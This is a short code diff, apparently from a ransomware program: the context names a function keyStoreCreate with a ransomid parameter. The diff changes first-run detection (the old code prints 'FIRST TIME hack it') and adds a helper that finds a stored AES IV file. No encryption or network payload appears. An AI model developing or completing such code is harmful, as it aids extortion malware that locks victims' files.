@@ -105,9 +105,18 @@ def keyStoreCreate(version,ransomid):
     print("STORE FILE CREATED")
 
 
-def checkFirstTime():
-    if len(sys.argv) > 1:
-        print("print second time show only gui")
-        return False
-    print("FIRST TIME hack it")
-    return True
+def checkFirstTime(mode):
+    argc = len(sys.argv)
+    if mode == "online":
+        if argc == 1:
+            print("SECOND TIME")
+            return False
+        else:
+            print("FIRST TIME")
+            return True
+
+def whichFile():
+    for filee in os.listdir():
+        if filee[-utils._len_aesIV_file_store_name:] == utils.aesIV_file_store_name:
+            return filee
+
